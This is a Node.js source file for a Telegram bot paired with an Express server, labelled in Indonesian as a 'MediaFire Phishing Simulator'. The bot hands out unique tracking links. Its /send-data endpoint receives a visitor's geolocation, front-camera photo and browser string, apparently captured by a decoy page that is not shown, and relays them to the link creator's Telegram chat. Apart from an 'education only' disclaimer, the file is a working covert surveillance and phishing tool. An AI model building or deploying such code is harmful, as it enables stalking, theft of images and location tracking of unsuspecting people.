const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const path = require('path');
require('dotenv').config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, {polling: true});
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json({limit: '10mb'}));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

const SECRET_KEY = process.env.SECRET_KEY;
const PHISHING_URL = process.env.PHISHING_URL || `http://localhost:${PORT}`;

function generateToken(chatId) {
  const hmac = crypto.createHmac('sha256', SECRET_KEY);
  hmac.update(chatId.toString());
  return hmac.digest('hex').slice(0, 12);
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `🔒 MediaFire Phishing Simulator\n\nGunakan perintah /generate untuk membuat link phishing edukasi.`
  );
});

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  const token = generateToken(chatId);
  const uniqueUrl = `${PHISHING_URL}/?chat_id=${chatId}&token=${token}`;
  
  bot.sendMessage(
    chatId,
    `🔗 Phishing Link Created\n\n` +
    `Berikut link untuk edukasi keamanan digital:\n` +
    `${uniqueUrl}\n\n` +
    `PERINGATAN: Ini hanya untuk tujuan edukasi. Jangan disalahgunakan!`
  );
});

app.post('/send-data', async (req, res) => {
  try {
    const { chatId, token, location, photo, userAgent } = req.body;
    
    console.log('Data received:', { 
      chatId, 
      hasToken: !!token, 
      hasLocation: !!location, 
      hasPhoto: !!photo, 
      userAgent: userAgent ? userAgent.substring(0, 50) + '...' : 'none' 
    });
    
    const expectedToken = generateToken(chatId);
    if (token !== expectedToken) {
      console.log('Invalid token received');
      return res.status(403).json({ success: false, message: 'Invalid token' });
    }

    // Send location
    if (location && location.latitude && location.longitude) {
      await bot.sendLocation(chatId, location.latitude, location.longitude);
    }
    
    // Prepare message
    let message = `📱 Data Edukasi Phishing\n`;
    if (location && location.latitude && location.longitude) {
      message += `📍 Lokasi: ${location.latitude}, ${location.longitude}\n`;
    } else {
      message += `📍 Lokasi: Tidak berhasil diperoleh\n`;
    }
    message += `🌐 Browser: ${userAgent || 'Tidak diketahui'}\n`;
    message += `📸 Foto: ${photo ? 'Tersedia' : 'Tidak tersedia'}`;
    
    await bot.sendMessage(chatId, message);
    
    // Send photo if available
    if (photo) {
      try {
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        await bot.sendPhoto(chatId, buffer, {caption: 'Foto dari kamera depan pengguna'});
        console.log('Photo sent successfully');
      } catch (photoError) {
        console.error('Error sending photo:', photoError);
        await bot.sendMessage(chatId, '⚠️ Gagal mengirim foto');
      }
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Error in send-data:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log("Bot Telegram started...");
});
